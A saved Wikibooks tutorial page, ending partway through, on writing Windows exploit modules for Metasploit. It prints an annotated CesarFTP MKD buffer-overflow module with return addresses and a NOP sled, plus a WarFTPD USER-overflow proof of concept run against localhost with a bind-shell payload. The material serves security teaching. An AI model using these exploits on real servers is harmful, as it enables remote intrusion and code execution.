<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!-- saved from url=(0061)http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit -->
<html lang="en" dir="ltr" xmlns="http://www.w3.org/1999/xhtml" class="client-chrome client-chrome-1 client-webkit client-win"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Metasploit/WritingWindowsExploit - Wikibooks, open books for an open world</title>

<meta http-equiv="Content-Style-Type" content="text/css">
<meta name="generator" content="MediaWiki 1.17wmf1">
<link rel="alternate" type="application/x-wiki" title="Edit" href="http://en.wikibooks.org/w/index.php?title=Metasploit/WritingWindowsExploit&action=edit">
<link rel="edit" title="Edit" href="http://en.wikibooks.org/w/index.php?title=Metasploit/WritingWindowsExploit&action=edit">
<link rel="shortcut icon" href="http://en.wikibooks.org/favicon.ico">
<link rel="search" type="application/opensearchdescription+xml" href="http://en.wikibooks.org/w/opensearch_desc.php" title="Wikibooks (en)">
<link rel="EditURI" type="application/rsd+xml" href="http://en.wikibooks.org/w/api.php?action=rsd">
<link rel="copyright" href="http://creativecommons.org/licenses/by-sa/3.0/">
<link rel="alternate" type="application/atom+xml" title="Wikibooks Atom feed" href="http://en.wikibooks.org/w/index.php?title=Special:RecentChanges&feed=atom">
<link rel="stylesheet" href="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/load.php" type="text/css" media="all">
<link rel="stylesheet" href="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/flaggedrevs.css" type="text/css" media="all">
<link rel="stylesheet" href="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/readerfeedback.css" type="text/css" media="all"><style type="text/css" media="all">.suggestions{overflow:hidden;position:absolute;top:0px;left:0px;width:0px;border:none;z-index:99;padding:0;margin:-1px -1px 0 0} html > body .suggestions{margin:-1px 0 0 0}.suggestions-special{position:relative;background-color:Window;font-size:0.8em;cursor:pointer;border:solid 1px #aaaaaa;padding:0;margin:0;margin-top:-2px;display:none;padding:0.25em 0.25em;line-height:1.25em}.suggestions-results{background-color:white;background-color:Window;font-size:0.8em;cursor:pointer;border:solid 1px #aaaaaa;padding:0;margin:0}.suggestions-result{color:black;color:WindowText;margin:0;line-height:1.5em;padding:0.01em 0.25em;text-align:left}.suggestions-result-current{background-color:#4C59A6;background-color:Highlight;color:white;color:HighlightText}.suggestions-special .special-label{font-size:0.8em;color:gray;text-align:left}.suggestions-special .special-query{color:black;font-style:italic;text-align:left}.suggestions-special .special-hover{background-color:silver}.suggestions-result-current .special-label,.suggestions-result-current .special-query{color:white;color:HighlightText}.autoellipsis-matched,.highlight{font-weight:bold}

/* cache key: enwikibooks:resourceloader:filter:minify-css:5:8d395f27880b6ffcab73b1c74b0217ea */</style><style type="text/css" media="all">#mw-panel.collapsible-nav div.portal{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIwAAAABCAMAAAA7MLYKAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAEtQTFRF29vb2tra4ODg6urq5OTk4uLi6+vr7e3t7Ozs8PDw5+fn4+Pj4eHh3d3d39/f6Ojo5eXl6enp8fHx8/Pz8vLy7+/v3Nzc2dnZ2NjYnErj7QAAAD1JREFUeNq0wQUBACAMALDj7hf6JyUFGxzEnYhC9GaNPG1xVffGDErk/iCigLl1XV2xM49lfAxEaSM+AQYA9HMKuv4liFQAAAAASUVORK5CYII=);background-image:url(http://bits.wikimedia.org/w/extensions-1.17/Vector/modules/./images/portal-break.png?2011-02-12T21:25:00Z)!ie;background-position:left top;background-repeat:no-repeat;padding:0.25em 0 !important;margin:-11px 9px 10px 11px}#mw-panel.collapsible-nav div.portal h5{color:#4D4D4D;font-weight:normal;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAA9QTFRFeXl53d3dmpqasbGx////GU0iEgAAAAV0Uk5T/////wD7tg5TAAAAK0lEQVQI12NwgQIG0hhCDAwMTCJAhqMCA4MiWEoIJABiOCooQhULi5BqMgB2bh4svs8t+QAAAABJRU5ErkJggg==) left center no-repeat;background:url(http://bits.wikimedia.org/w/extensions-1.17/Vector/modules/./images/open.png?2011-02-12T21:25:00Z) left center no-repeat!ie;padding:4px 0 3px 1.5em;margin-bottom:0px}#mw-panel.collapsible-nav div.collapsed h5{color:#0645AD;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAAxQTFRF3d3deXl5////nZ2dQA6SoAAAAAN0Uk5T//8A18oNQQAAADNJREFUeNpiYEIDDMQKMKALMDOgCTDCRWACcBG4AEwEIcDITEAFuhnotmC4g4EEzwEEGAADqgHmQSPJKgAAAABJRU5ErkJggg==) left center no-repeat;background:url(http://bits.wikimedia.org/w/extensions-1.17/Vector/modules/./images/closed-ltr.png?2011-02-12T21:25:00Z) left center no-repeat!ie;margin-bottom:0px}#mw-panel.collapsible-nav div h5:hover{cursor:pointer;text-decoration:none}#mw-panel.collapsible-nav div.collapsed h5:hover{text-decoration:underline}#mw-panel.collapsible-nav div.portal div.body{background:none !important;padding-top:0px;display:none}#mw-panel.collapsible-nav div.persistent div.body{display:block}#mw-panel.collapsible-nav div.first h5{display:none}#mw-panel.collapsible-nav div.persistent h5{background:none !important;padding-left:0.7em;cursor:default}#mw-panel.collapsible-nav div.portal div.body ul li{padding:0.25em 0}#mw-panel.collapsible-nav div.first{background-image:none;margin-top:0px}#mw-panel.collapsible-nav div.persistent div.body{margin-left:0.5em}

/* cache key: enwikibooks:resourceloader:filter:minify-css:5:c5cca4c308b0b64d12b1147b6871e86e */</style><meta name="ResourceLoaderDynamicStyles" content=""><link rel="stylesheet" href="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/load(1).php" type="text/css" media="all">
<style type="text/css" media="all">a.new,#quickbar a.new{color:#ba0000}

/* cache key: enwikibooks:resourceloader:filter:minify-css:5:f2a9127573a22335c2a9102b208c73e7 */</style>
<script src="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/load(2).php" type="text/javascript"></script><script src="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/load(3).php" type="text/javascript"></script>
<script type="text/javascript">if ( window.mediaWiki ) {
	mediaWiki.config.set({"wgCanonicalNamespace": "", "wgCanonicalSpecialPageName": false, "wgNamespaceNumber": 0, "wgPageName": "Metasploit/WritingWindowsExploit", "wgTitle": "Metasploit/WritingWindowsExploit", "wgAction": "view", "wgArticleId": 116389, "wgIsArticle": true, "wgUserName": null, "wgUserGroups": ["*"], "wgCurRevisionId": 2095451, "wgCategories": ["Metasploit"], "wgBreakFrames": false, "wgRestrictionEdit": [], "wgRestrictionMove": [], "wgSearchNamespaces": [0, 4, 112], "wgFlaggedRevsParams": {"tags": {"value": {"levels": 3, "quality": 2, "pristine": 3}}}, "wgStableRevisionId": 0, "wgRevContents": {"error": "Unable to get content.", "waiting": "Waiting for content"}, "wgVectorEnabledModules": {"collapsiblenav": true, "collapsibletabs": true, "editwarning": true, "expandablesearch": false, "footercleanup": false, "sectioneditlinks": false, "simplesearch": true, "experiments": true}, "wgWikiEditorEnabledModules": {"toolbar": true, "dialogs": true, "templateEditor": false, "templates": false, "addMediaWizard": false, "preview": false, "previewDialog": false, "publish": false, "toc": false}, "wgFeedbackParams": {"tags": {"reliability": 3, "completeness": 2, "npov": 2, "presentation": 1}}, "wgAjaxFeedback": {"sendingMsg": "Submitting â€¦", "sentMsg": "Thank you!"}, "Geo": {"city": "", "country": ""}, "wgNoticeProject": "wikibooks"});
}
</script>

<!--[if lt IE 7]><style type="text/css">body{behavior:url("/w/skins-1.17/vector/csshover.min.htc")}</style><![endif]--><link type="text/css" rel="stylesheet" href="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/index.php"><link type="text/css" rel="stylesheet" href="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/index(1).php"><script src="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/index(2).php" type="text/javascript"></script><script src="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/index(3).php" type="text/javascript"></script><script src="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/index(4).php" type="text/javascript"></script><script src="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/index(5).php" type="text/javascript"></script><script src="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/index(6).php" type="text/javascript"></script><script src="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/index(7).php" type="text/javascript"></script><script src="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/index(8).php" type="text/javascript"></script><script src="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/index(9).php" type="text/javascript"></script><script src="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/index(10).php" type="text/javascript"></script><script src="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/index(11).php" type="text/javascript"></script><script src="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/index(12).php" type="text/javascript"></script><script src="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/index(13).php" type="text/javascript"></script><script src="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/index(14).php" type="text/javascript"></script><script src="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/index(15).php" type="text/javascript"></script><link type="text/css" rel="stylesheet" href="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/index(16).php"><script src="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/index(17).php" type="text/javascript"></script></head>
<body class="mediawiki ltr ns-0 ns-subject page-Metasploit_WritingWindowsExploit skin-vector">
		<div id="mw-page-base" class="noprint"></div>
		<div id="mw-head-base" class="noprint"></div>
		<!-- content -->
		<div id="content">
			<a id="top"></a>
			<div id="mw-js-message" style="display:none;"></div>
						<!-- sitenotice -->
			<div id="siteNotice"><div id="centralNotice" class="expanded"><style type="text/css">

#centralNotice.collapsed #pifreferendum {
 display: none;
}

#pifreferendum {
 position: relative;
 overflow: hidden;
 background-image:url('http://upload.wikimedia.org/wikipedia/commons/0/0d/Gray-gradient1.png');
 background-repeat: repeat-x;
 margin-bottom: 0.5em !important;
 background-color:#FFFFFF;
 border: solid 1px #aaaaaa; 
 height:73px;
}

#pifreferendum a.cn-full-banner-click {
 display:block;
 height:100%;
 width:100%;
 cursor: pointer;
}

#pifreferendum a.cn-full-banner-click{
 text-decoration: none;
}



#pifreferendum-logo {
 position: absolute;
 top: 8px;
 left: 25px;
 background-image: url(http://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Wikimedia_logo_text_RGB.svg/60px-Wikimedia_logo_text_RGB.svg.png);
 height: 60px;
 width: 60px;
 background-repeat: no-repeat;
}

#pifreferendum-text {
 font-size: 1em;
 font-weight: bold;
 color: #333;
 padding: 10px 30px 10px 30px;
 line-height: 1.3em;
 text-align: center;
}

#pifreferndum-text3 {
 color: #006699
}

#pifreferndum-text3:hover {
 text-decoration: underline;
}

#pifreferendum div#cn-toggle-box {
 position: absolute;
 z-index: 98;
 top: 2px;
 right: 6px;
}

#pifreferendum .trans-box {
 text-align: right;
 font-size: 0.8em;
 padding-right: 6px;
 white-space: nowrap;
}
.rtl #pifreferendum-logo {
    left: auto;
    right: 25px;
}
.rtl #pifreferendum div#cn-toggle-box {
    right: auto;
    left: 6px;
}
.rtl #pifreferendum .trans-box {
    padding-right: 0;
    padding-left: 6px;
}

</style>

<div id="pifreferendum">

  <a class="cn-full-banner-click" href="http://meta.wikimedia.org/wiki/Image_filter_referendum">
    <div id="pifreferendum-logo"> </div>
    <div id="pifreferendum-text">
      <div id="pifreferendum-text1">The Wikimedia Foundation is holding a referendum to gather more input  <br> into the development and usage of an opt-in personal image hiding feature.</div>
      <div id="pifreferndum-text3">Learn more and share your view.</div>
    </div>
  </a>

  <div id="cn-toggle-box">
    <span class="trans-box">[<a href="http://meta.wikimedia.org/wiki/Image_filter_referendum/Translation">Help with translations!</a>]</span><a href="http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#" onclick="toggleNotice();return false"><img border="0" src="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/closewindow.png" alt="Close"></a>
  </div>

</div></div><!-- centralNotice loads here --></div>
			<!-- /sitenotice -->
						<!-- firstHeading -->
			<h1 id="firstHeading" class="firstHeading">Metasploit/WritingWindowsExploit</h1>
			<!-- /firstHeading -->
			<!-- bodyContent -->
			<div id="bodyContent">
				<!-- tagline -->
				<div id="siteSub">From Wikibooks, open books for an open world</div>
				<!-- /tagline -->
				<!-- subtitle -->
				<div id="contentSub"><span class="subpages">&lt; <a href="http://en.wikibooks.org/wiki/Metasploit" title="Metasploit">Metasploit</a></span><div id="mw-fr-revisiontag" class="flaggedrevs_notice plainlinks noprint"><img class="flaggedrevs-icon" src="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/1.png" alt="Unreviewed changes are displayed on this page" title="Unreviewed changes are displayed on this page">This page may need to be <a href="http://en.wikibooks.org/wiki/Wikibooks:REVIEW" title="Wikibooks:REVIEW" class="mw-redirect">reviewed</a> for quality.</div></div>
				<!-- /subtitle -->
																<!-- jumpto -->
				<div id="jump-to-nav">
					Jump to: <a href="http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#mw-head">navigation</a>,
					<a href="http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#p-search">search</a>
				</div>
				<!-- /jumpto -->
								<!-- bodytext -->
				<div align="center">
<table width="75%" cellspacing="0">
<tbody><tr>
<td style="background-color: #f4f3ff; border: 1px solid #000000; padding: 0.5em; font-size: small; text-align: center"><a href="http://en.wikibooks.org/wiki/Metasploit" title="Metasploit">Metasploit</a><br>
<a href="http://en.wikibooks.org/wiki/Metasploit/Frequently_Asked_Questions" title="Metasploit/Frequently Asked Questions">FAQs</a></td>
</tr>
</tbody></table>
</div>
<p><br>
<b>Writing a Windows Exploit for the Metasploit Framework</b></p>
<hr>
<table id="toc" class="toc">
<tbody><tr>
<td>
<div id="toctitle">
<h2>Contents</h2>
 <span class="toctoggle">[<a id="togglelink" class="internal" href="http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#">hide</a>]</span></div>
<ul>
<li class="toclevel-1 tocsection-1"><a href="http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#Abstract"><span class="tocnumber">1</span> <span class="toctext">Abstract</span></a></li>
<li class="toclevel-1 tocsection-2"><a href="http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#Overview"><span class="tocnumber">2</span> <span class="toctext">Overview</span></a></li>
<li class="toclevel-1 tocsection-3"><a href="http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#Requirements"><span class="tocnumber">3</span> <span class="toctext">Requirements</span></a></li>
<li class="toclevel-1 tocsection-4"><a href="http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#Getting_started"><span class="tocnumber">4</span> <span class="toctext">Getting started</span></a>
<ul>
<li class="toclevel-2 tocsection-5"><a href="http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#Editing_an_exploit_module"><span class="tocnumber">4.1</span> <span class="toctext">Editing an exploit module</span></a></li>
<li class="toclevel-2 tocsection-6"><a href="http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#Writing_an_exploit_module"><span class="tocnumber">4.2</span> <span class="toctext">Writing an exploit module</span></a>
<ul>
<li class="toclevel-3 tocsection-7"><a href="http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#The_target"><span class="tocnumber">4.2.1</span> <span class="toctext">The target</span></a></li>
<li class="toclevel-3 tocsection-8"><a href="http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#The_vulnerability"><span class="tocnumber">4.2.2</span> <span class="toctext">The vulnerability</span></a></li>
<li class="toclevel-3 tocsection-9"><a href="http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#The_PoC"><span class="tocnumber">4.2.3</span> <span class="toctext">The PoC</span></a>
<ul>
<li class="toclevel-4 tocsection-10"><a href="http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#Debugging"><span class="tocnumber">4.2.3.1</span> <span class="toctext">Debugging</span></a></li>
</ul>
</li>
<li class="toclevel-3 tocsection-11"><a href="http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#Fine_tuning"><span class="tocnumber">4.2.4</span> <span class="toctext">Fine tuning</span></a>
<ul>
<li class="toclevel-4 tocsection-12"><a href="http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#Finding_space_available"><span class="tocnumber">4.2.4.1</span> <span class="toctext">Finding space available</span></a></li>
<li class="toclevel-4 tocsection-13"><a href="http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#Finding_a_return_address"><span class="tocnumber">4.2.4.2</span> <span class="toctext">Finding a return address</span></a></li>
<li class="toclevel-4 tocsection-14"><a href="http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#Dealing_with_badchars"><span class="tocnumber">4.2.4.3</span> <span class="toctext">Dealing with badchars</span></a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li class="toclevel-1 tocsection-15"><a href="http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#References"><span class="tocnumber">5</span> <span class="toctext">References</span></a></li>
</ul>
</td>
</tr>
</tbody></table>
<h2><span class="editsection">[<a href="http://en.wikibooks.org/w/index.php?title=Metasploit/WritingWindowsExploit&action=edit&section=1" title="Edit section: Abstract">edit</a>]</span> <span class="mw-headline" id="Abstract">Abstract</span></h2>
<p>This page explains how to write a Windows Exploit for the Metasploit Framework v3.x.<br>
This page doesn't explain how to find vulnerabilities. (For this, please see Fuzzing)</p>
<p><br></p>
<h2><span class="editsection">[<a href="http://en.wikibooks.org/w/index.php?title=Metasploit/WritingWindowsExploit&action=edit&section=2" title="Edit section: Overview">edit</a>]</span> <span class="mw-headline" id="Overview">Overview</span></h2>
<p>The Metasploit Framework helps to write reliable exploits easily and quickly.<br>
The Metasploit Framework uses the <b>Ruby language</b>.</p>
<p><br></p>
<h2><span class="editsection">[<a href="http://en.wikibooks.org/w/index.php?title=Metasploit/WritingWindowsExploit&action=edit&section=3" title="Edit section: Requirements">edit</a>]</span> <span class="mw-headline" id="Requirements">Requirements</span></h2>
<p><b>Technical skills</b></p>
<ul>
<li>Some skills about the use of the Metasploit Framework.<br></li>
<li>Some programming skills <i>(Ruby skills are useful but not fully required)</i><br></li>
<li>Some understanding about the Windows memory management <i>(Heap, Stack, Registers)</i></li>
</ul>
<p><b>Materials</b></p>
<ul>
<li>The Metasploit Framework installed and working<br></li>
<li>A Windows platform<br></li>
<li>A debugger [1]<br></li>
<li>A text editor</li>
</ul>
<p><br></p>
<h2><span class="editsection">[<a href="http://en.wikibooks.org/w/index.php?title=Metasploit/WritingWindowsExploit&action=edit&section=4" title="Edit section: Getting started">edit</a>]</span> <span class="mw-headline" id="Getting_started">Getting started</span></h2>
<p>In the Metasploit Framework, an exploit is called an "<b>exploit module</b>".<br>
<br>
Exploit modules are located by default in:<br>
C:\Program Files\Metasploit\Framework3\home\framework\modules\exploits\<br>
(also check C:\Documents and Settings\&lt;Your User Name&gt;\Application Data\msf3\modules\exploits if you do not find in above path)<br>
<br>
Exploit modules are classified by platforms (<i>OSes</i>) and then by types (<i>protocols</i>).<br>
<br></p>
<h3><span class="editsection">[<a href="http://en.wikibooks.org/w/index.php?title=Metasploit/WritingWindowsExploit&action=edit&section=5" title="Edit section: Editing an exploit module">edit</a>]</span> <span class="mw-headline" id="Editing_an_exploit_module">Editing an exploit module</span></h3>
<p><br>
A good way to understand how an exploit module is written is to first edit one.<br>
<br>
We edit this module:<br>
C:\Program Files\Metasploit\Framework3\home\framework\modules\exploits\windows\ftp\cesarftp_mkd.rb<br>
<br>
<font color="red">#Notes of the author are noted in red.</font><br></p>
<pre>##
# $Id: cesarftp_mkd.rb 4419 2007-02-18 00:10:39Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# <a href="http://metasploit.com/projects/Framework/" class="external free" rel="nofollow">http://Metasploit.com/projects/Framework/</a>
##

<font color="red">#Comment lines start with a # (<i>they won't be executed</i>)</font>

require 'msf/core' <font color="red">#We will always need the core library</font>

module Msf <font color="red">#This line should always be present</font>

class <font color="blue">Exploits</font>::Windows::Ftp::Cesarftp_Mkd &lt; Msf::Exploit::Remote
<font color="red">#The name of the class (<i>Exploits::Windows::Ftp::Cesarftp_Mkd</i>) specifies where the exploit module 
#is physically located (<i>*\exploits\windows\ftp\cesarftp_mkd.rb</i>). The filename of the exploit
#module (<i>cesarftp_mkd.rb</i>) should be the same as the name of the class (<i>Cesarftp_Mkd</i>)</font><br>
        include Exploit::Remote::Ftp <font color="red">#We use MSF's built-in Ftp functions</font>

        def initialize(info = {})
                super(update_info(info, 
                        'Name'           =&gt; 'Cesar FTP 0.99g MKD Command Buffer Overflow',
                        <font color="red">#An understandable, detailed name (displayed in the console)</font>
                        'Description'    =&gt; %q{
                                This module exploits a stack overflow in the MKD verb in CesarFTP 0.99g.
                        <font color="red">#The description of the module/vulnerability</font>
                        },
                        'Author'         =&gt; 'MC', <font color="red">#The (nick)name of the author of this module</font>
                        'License'        =&gt; MSF_LICENSE, <font color="red">#Type of license</font>
                        'Version'        =&gt; '$Revision: 4419 $', <font color="red">#Version number of the module</font>
                        'References'     =&gt; <font color="red">#Various 'URLs' about the vulnerability</font>
                                [
                                        [ 'BID', '18586'],
                                        [ 'CVE', '2006-2961'],
                                        [ 'URL', 'http://secunia.com/advisories/20574/' ],
                                ],
                        'Privileged'     =&gt; true,
                        'DefaultOptions' =&gt;
                                {
                                        'EXITFUNC' =&gt; 'process',
                                },
                        'Payload'        =&gt;
                                {
                                        'Space'    =&gt; 250, <font color="red">#Maximum space available in memory to store the shellcode (payload)</font>
                                        'BadChars' =&gt; "\x00\x20\x0a\x0d", <font color="red">#List of the forbidden characters</font>
                                        'StackAdjustment' =&gt; -3500,
                                },
                        'Platform'       =&gt; 'win', <font color="red">#Type of the target's platform</font>
                        'Targets'        =&gt;
                        <font color="red">#List of the targets and return addresses</font>
                                [
                                        [ 'Windows 2000 Pro SP4 English', { 'Ret' =&gt; 0x77e14c29 } ],
                                        [ 'Windows XP SP2 English',       { 'Ret' =&gt; 0x76b43ae0 } ],
                                        [ 'Windows 2003 SP1 English',     { 'Ret' =&gt; 0x76AA679b } ],
                                ],
                        'DisclosureDate' =&gt; 'Jun 12 2006', <font color="red">#Vulnerability disclosure date</font>
                        'DefaultTarget'  =&gt; 0
                        <font color="red">#Default target used if not specified by the user (<i>in this case: Windows 2000 Pro SP4 English</i>)</font>
                )
                )
        end

        def check <font color="red">#Function used to check if a target is vulnerable</font>
                connect
                disconnect      
        
                if (banner =~ /CesarFTP 0\.99g/) <font color="red">#We test the banner returned by the server</font>
                        return Exploit::CheckCode::Vulnerable <font color="red">#The server is vulnerable</font>
                end
                        return Exploit::CheckCode::Safe <font color="red">#The server is NOT vulnerable</font>
        end
        
        def exploit <font color="red">#We defines our exploit</font>
                connect_login <font color="red">#We use the <i>Ftp login function</i></font>

                sploit =  "\n" * 671 + Rex::Text.rand_text_english(3, payload_badchars) <font color="red">#Padding</font>
                sploit &lt;&lt; [target.ret].pack('V') + make_nops(40) + payload.encoded
                <font color="red">#Return address (little endian converted) + nop sled + payload</font>

                print_status("Trying target #{target.name}...")

                send_cmd( ['MKD', sploit] , false) <font color="red">#We send our exploit code to the target</font>

                handler
                disconnect <font color="red">#We close the connection</font>
        end

end
end
</pre>
<h3><span class="editsection">[<a href="http://en.wikibooks.org/w/index.php?title=Metasploit/WritingWindowsExploit&action=edit&section=6" title="Edit section: Writing an exploit module">edit</a>]</span> <span class="mw-headline" id="Writing_an_exploit_module">Writing an exploit module</span></h3>
<h4><span class="editsection">[<a href="http://en.wikibooks.org/w/index.php?title=Metasploit/WritingWindowsExploit&action=edit&section=7" title="Edit section: The target">edit</a>]</span> <span class="mw-headline" id="The_target">The target</span></h4>
<p>To understand how to write an exploit module for the Metasploit Framework, we'll write an exploit for an easily exploitable vulnerability in WarFTPD version 1.5 [2].<br>
<i>(Note that the exploit module for this vulnerability already exists in the Metasploit Framework, but we are trying to build our own exploit.)</i><br>
We download and install WarFTPD in our local Windows machine.<br>
We start WarFTPD Daemon.<br>
We uncheck the "No anonymous logins" checkbox.<br>
We start the FTP server (click on the "Go Online/Offline" button)<br>
<br></p>
<p><br>
<br>
Ok, the server is now waiting for us...</p>
<h4><span class="editsection">[<a href="http://en.wikibooks.org/w/index.php?title=Metasploit/WritingWindowsExploit&action=edit&section=8" title="Edit section: The vulnerability">edit</a>]</span> <span class="mw-headline" id="The_vulnerability">The vulnerability</span></h4>
<p>The first thing to do is to find information about the vulnerability in question. There are many possible sources for this.<br>
Here's an example:<br>
<a href="http://osvdb.org/displayvuln.php?osvdb_id=875&print" class="external free" rel="nofollow">http://osvdb.org/displayvuln.php?osvdb_id=875&amp;print</a><br>
<br>
We now see that the bug can be triggered by sending <i>a specially crafted request</i> in the USER command.<br>
Often a very long string will trigger this sort of bug, but let's verify that.</p>
<h4><span class="editsection">[<a href="http://en.wikibooks.org/w/index.php?title=Metasploit/WritingWindowsExploit&action=edit&section=9" title="Edit section: The PoC">edit</a>]</span> <span class="mw-headline" id="The_PoC">The PoC</span></h4>
<p>We first reproduce the vulnerability.<br>
For this, we directly use the Metasploit Framework.<br>
We create the file:<br>
C:\Program Files\Metasploit\Framework3\home\framework\modules\exploits\windows\ftp\warftpd.rb<br>
<br>
We open this file and write (copy/paste) the following code in it:</p>
<pre>##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# <a href="http://metasploit.com/projects/Framework/" class="external free" rel="nofollow">http://Metasploit.com/projects/Framework/</a>
##

require 'msf/core'
 

class Metasploit3 &lt; Msf::Exploit::Remote
        Rank = AverageRanking
   
   #The names of the exploit module and the class are 'equal' 

        include Msf::Exploit::Remote::Ftp

        def initialize(info = {})
                super(update_info(info,
                        'Name'           =&gt; 'War-FTPD 1.65 Username Overflow',
                        'Description'    =&gt; %q{
                                This module exploits a buffer overflow found in the USER command
                                of War-FTPD 1.65.
                        },      #End of Description
                        'Author'         =&gt; 'Your Name',     #Change this value with your (nick)name
                        'License'        =&gt; MSF_LICENSE,
                        'Version'        =&gt; '$Revision: 1 $',
                        'References'     =&gt; 
                                [
                                        [ 'URL', '<a href="http://osvdb.org/displayvuln.php?osvdb_id=875&print'" class="external free" rel="nofollow">http://osvdb.org/displayvuln.php?osvdb_id=875&amp;print'</a> ]
                                        #The URL mentioned above
                                ],
                        'DefaultOptions' =&gt; 
                                {
                                        'EXITFUNC' =&gt; 'process'
                                },
                        'Payload'        =&gt;
                                {
                                        'Space'    =&gt; 1000,          #We actually don't know the correct value for this
                                        'BadChars' =&gt; "\x00"
                                        #We actually don't know the correct value for this
                                },
                        'Targets'        =&gt;
                                [
                                        # Target 0
                                        [
                                                'Our Windows Target',
                                                #Replace this with your Windows target platform (ie: Windows 2000 SP4)
                                                {
                                                        'Platform' =&gt; 'win', #We exploit a Windows target
                                                        'Ret'      =&gt; 0x01020304
                                                        #We actually don't know the correct value for this
                                                }
                                        ]
                                ]
                )       #End of update_info()
                )       #End of super()
        end     #End of initialize

        def exploit
                connect

                print_status("Trying target #{target.name}...")

                exploit          = 'A' * 1000   #We first try to trigger the bug by sending a long string of 1000 "A"

                send_cmd( ['USER', exploit] , false )   #We send our evil string

                handler
                disconnect      #We disconnect from the server 
        end     #End of exploit

end     #End of class
</pre>
<p><br>
The WarFTPD server is running (listening on default port 21/tcp).<br>
We now launch the Metasploit Framework's console.<br>
<i>(Start / Programs / Metasploit3 / MSFConsole)</i><br>
<br>
We can now view our exploit using this command:<br>
show exploits<br>
<br>
<a href="http://en.wikibooks.org/wiki/File:Msf_book_warftpd_console00.png" class="image"><img alt="Msf book warftpd console00.png" src="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/Msf_book_warftpd_console00.png" width="661" height="89"></a><br>
<br>
We now launch our exploit using these commands:<br>
use windows/ftp/warftpd<br>
set RHOST 127.0.0.1<br>
set TARGET 0<br>
set PAYLOAD generic/shell_bind_tcp<br>
exploit<br>
<br>
<br>
<a href="http://en.wikibooks.org/wiki/File:Msf_book_warftpd_console01.png" class="image"><img alt="Msf book warftpd console01.png" src="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/Msf_book_warftpd_console01.png" width="476" height="306"></a></p>
<p>After few seconds we see the WarFTPD Dameon FTP Server disappearing (crashing).<br>
We have successfully reproduced the bug.</p>
<p><br></p>
<h5><span class="editsection">[<a href="http://en.wikibooks.org/w/index.php?title=Metasploit/WritingWindowsExploit&action=edit&section=10" title="Edit section: Debugging">edit</a>]</span> <span class="mw-headline" id="Debugging">Debugging</span></h5>
<p>To see what happens when the server crashes, we use a debugger.<br>
We launch again WarFTPD Daemon and attach our debugger to it.<br>
=&gt; In OllyDbg, we use "File/Attach", choose the WarFTPD process, click Ok and after it has been loaded, we press the F9 key to have it Running.<br>
<br></p>
<p><br>
We launch our exploit again.<br>
We can now look at our debugger.<br>
We see that an access violation is triggered.<br>
